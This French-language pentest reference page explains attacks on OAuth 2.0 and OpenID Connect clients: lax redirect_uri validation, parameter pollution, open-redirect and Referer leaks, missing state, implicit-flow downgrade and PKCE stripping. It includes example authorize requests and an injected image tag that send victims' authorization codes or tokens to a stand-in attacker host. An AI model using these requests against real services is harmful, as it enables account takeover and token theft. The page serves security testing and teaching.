---
title: "Attaquer OAuth et OpenID Connect : abus de redirect_uri, absence de state et vol de code/jeton"
description: "Comment un pentester vole des codes d'autorisation et des jetons aux parties de confiance OAuth/OIDC : validation faible de redirect_uri, chaînage d'open redirect, absence de state/nonce, downgrade implicite et stripping de PKCE."
keywords:
  - OAuth
  - OpenID Connect
  - redirect_uri
  - prise de contrôle de compte
  - state CSRF
  - PKCE
---

# Mauvaise configuration de redirection OAuth

Des bugs côté partie de confiance (client) dans le flux de code d'autorisation OAuth 2.0 / OpenID Connect (OIDC) qui permettent à un attaquant de voler le code d'autorisation ou le jeton d'une victime, ou de lier le compte de la victime à une identité contrôlée par l'attaquant. Le résultat est une **prise de contrôle de compte**, souvent pré-authentification et sans aucune interaction de la victime au-delà du chargement d'un lien.

## Vue d'ensemble

Dans le flux de code d'autorisation, le client redirige le navigateur vers le serveur d'autorisation (AS) `/authorize` avec `client_id`, `redirect_uri`, `response_type=code`, `scope` et (pour les clients OIDC/publics) `state`, `nonce` et PKCE (`code_challenge`). Après que l'utilisateur s'est authentifié et a donné son consentement, l'AS redirige vers `redirect_uri` avec `?code=…&state=…` ; le backend du client échange ensuite le code (plus `client_secret` ou le `code_verifier` de PKCE) contre des jetons.

Deux paramètres portent la sécurité de toute la chorégraphie : **`redirect_uri`** (où le code est délivré, qui doit être validé par correspondance exacte) et **`state`** (une valeur non devinable liée à la session de l'utilisateur qui défend le callback contre le CSRF). La BCP de sécurité OAuth 2.0 (RFC 9700 section 2.1) exige une **correspondance exacte de chaîne** de `redirect_uri`, à la seule exception d'un port variable pour les applications natives `localhost`. Presque toutes les attaques ci-dessous sont un relâchement de cette règle ou un contrôle manquant de `state`/`nonce`/PKCE.

## Comment ça marche

La validation de `redirect_uri` casse partout où l'AS fait quelque chose de plus faible qu'une correspondance exacte :

- **Préfixe / sous-chaîne / « commence par »** : `https://client.com/callback` enregistré accepte `https://client.com.attacker.net/callback` ou `https://client.com/callback.attacker.com`.
- **Tolérance de sous-répertoire** : tout chemin sur l'hôte est accepté ; pivotez via un redirecteur ouvert ou une page d'injection HTML sur cet hôte.
- **Failles de wildcard / regex** : `https://*.site.example/*` peut permettre `https://attacker.example/.site.example` ; `.` non échappé dans la regex.
- **Divergences d'analyseur d'URL** entre le validateur et le navigateur : `https://client.com&@attacker.net#@x.attacker.net/`, userinfo `@`, backslashes, caractères encodés.
- **Pollution de paramètres** : deux valeurs de `redirect_uri` ; le validateur en lit une, la redirection utilise l'autre.
- **Downgrade de schéma** : un callback `http://` permet l'interception réseau.

## Exploitation

### Vol direct de code via redirect_uri

Pointez `redirect_uri` vers votre serveur. Si l'AS détient encore une session active pour la victime et saute le re-consentement, le code vous est délivré :

```
GET /authorize?client_id=12345
  &redirect_uri=https://client-app.com.attacker.net/callback
  &response_type=code&scope=openid%20profile&state=xyz HTTP/1.1
Host: oauth-as.com

→ 302 https://client-app.com.attacker.net/callback?code=VICTIM_CODE&state=xyz
```

Votre serveur journalise `VICTIM_CODE`. Le code n'est ensuite utile que là où vous pouvez réellement l'échanger, car un endpoint de jeton conforme à OAuth lie le code au `redirect_uri` envoyé à `/authorize` et rejettera un échange qui en présente un différent. Cette condition est remplie lorsque l'un des cas suivants est vrai : l'endpoint de jeton n'impose pas la liaison de `redirect_uri` ; le client est un **client public sans PKCE**, de sorte que vous échangez vous-même le code à l'endpoint de jeton en utilisant le `redirect_uri` contrôlé par l'attaquant et le `client_id` public (aucun secret nécessaire) ; ou vous avez obtenu le `client_secret`. Un `state` frais choisi par l'attaquant n'empêche pas le vol, car l'attaquant contrôle sa propre valeur.

Variante de **pollution de paramètres** :

```
GET /authorize?client_id=12345
  &redirect_uri=https://client-app.com/callback
  &redirect_uri=https://attacker.net&response_type=code&scope=openid HTTP/1.1
```

### Chaînage d'open redirect et fuite par Referer

Lorsque les cibles de redirection externes sont bloquées, chaînez un **redirecteur ouvert** sur un hôte en liste blanche (`?returnUrl=`, `?redirect_to=`) ; avec le réattachement de fragment, un jeton dans le fragment de l'URL survit jusqu'au domaine de l'attaquant. Sinon, définissez `redirect_uri` vers une page en liste blanche où vous pouvez injecter `<img src="https://attacker.net">` : certains navigateurs divulguent l'URL de callback complète (y compris `?code=`) dans le `Referer`. Du JavaScript tiers sur la page de callback peut le divulguer de la même façon (le cas Detectify/LastPass).

### Absence de state vers login CSRF / liaison d'identité

Si `state` est absent ou jamais vérifié, capturez *votre propre* code d'autorisation, puis incitez la victime à charger `…/callback?code=ATTACKER_CODE`. Le compte client de la victime se lie silencieusement à l'identité du fournisseur d'identité de l'**attaquant** ; l'attaquant se connecte plus tard et voit tout ce que la victime ajoute. La RFC 9700 section 4.7.1 note que si l'attaquant peut lire la réponse, il peut aussi rejouer un `state` divulgué, donc seul PKCE défend robustement cela.

### Downgrade implicite et stripping de PKCE

Basculez `response_type=code` en `token` pour recevoir le jeton directement dans le fragment, où la fuite est plus facile :

```
GET /authorize?...&response_type=token&scope=openid%20email&state=xyz
→ 302 …/callback#access_token=VICTIM_TOKEN&token_type=Bearer
```

Là où PKCE n'est pas imposé, retirez `code_challenge` ou rétrogradez `S256` vers `plain` pour permettre l'injection de code.

### Confusion de jeton / de liaison d'identité

Un client qui échange ou accepte un jeton sans vérifier son `aud`/`iss`/client émetteur peut se voir fournir un code ou un jeton frappé pour une *application différente* et le promouvoir en session de première partie (les cas « Oh-Auth » de Salt Labs : Grammarly/Vidio/Bukalapak et Booking.com). Un chemin connexe est la **pré-prise de contrôle de compte** : inscrivez-vous chez l'IdP avec l'e-mail non vérifié de la victime ; un client qui fait confiance à l'e-mail asserté par l'IdP vous fusionne dans le compte de la victime.

## Outils

- **Burp Suite** (Repeater/Intruder ; les extensions de style EsPReSSO et OAuthScan pour l'analyse de flux).
- Un **serveur d'exploitation** contrôlé pour recevoir les codes/jetons redirigés pendant un test autorisé.

## Références

- PortSwigger Web Security Academy : [OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- RFC 9700 : [Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700.html) ; RFC 6749 : [The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749) ; RFC 7636 : [PKCE](https://www.rfc-editor.org/rfc/rfc7636)
- OpenID Connect Core 1.0 : [`nonce` sections 3.1.3.7, 15.5.2](https://openid.net/specs/openid-connect-core-1_0.html)
- Salt Labs : [Oh-Auth: Abusing OAuth to take over millions of accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
- Detectify Labs : [How I made LastPass give me all your passwords](https://labs.detectify.com/writeups/how-i-made-lastpass-give-me-all-your-passwords/)
